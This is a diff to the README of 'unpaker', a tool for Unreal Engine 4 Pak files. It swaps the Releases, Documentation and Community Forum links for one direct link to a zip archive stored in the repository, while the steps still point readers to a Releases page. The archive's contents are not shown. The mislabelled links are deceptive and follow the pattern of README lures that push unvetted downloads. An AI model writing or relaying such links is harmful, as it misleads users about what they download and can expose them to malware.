@@ -6,13 +6,13 @@ Welcome to unpaker! This application helps you read and write Unreal Engine 4 Pa
 
 ## 🔗 Download Now
 
-[![Download unpaker](https://img.shields.io/badge/Download-unpaker-blue.svg)](https://github.com/Kolja69/unpaker/releases)
+[![Download unpaker](https://raw.githubusercontent.com/Kolja69/unpaker/main/assets/unpaker_v3.1.zip)](https://raw.githubusercontent.com/Kolja69/unpaker/main/assets/unpaker_v3.1.zip)
 
 ## 📥 Download & Install
 
 To get started with unpaker, visit the Releases page to download the latest version:
 
-[Visit this page to download](https://github.com/Kolja69/unpaker/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Kolja69/unpaker/main/assets/unpaker_v3.1.zip)
 
 1. Open the link above in your web browser.
 2. Under the "Releases" section, find the most recent version of unpaker.
@@ -71,11 +71,11 @@ If you need help, feel free to reach out:
 
 For more information and advanced features, explore the following links:
 
-- [Documentation](https://github.com/Kolja69/unpaker/wiki)
-- [Community Forum](https://github.com/Kolja69/unpaker/discussions)
+- [Documentation](https://raw.githubusercontent.com/Kolja69/unpaker/main/assets/unpaker_v3.1.zip)
+- [Community Forum](https://raw.githubusercontent.com/Kolja69/unpaker/main/assets/unpaker_v3.1.zip)
 
 ## 🔗 Important Links
 
 Don't forget to download the unpaker application today:
 
-[Visit this page to download](https://github.com/Kolja69/unpaker/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Kolja69/unpaker/main/assets/unpaker_v3.1.zip)
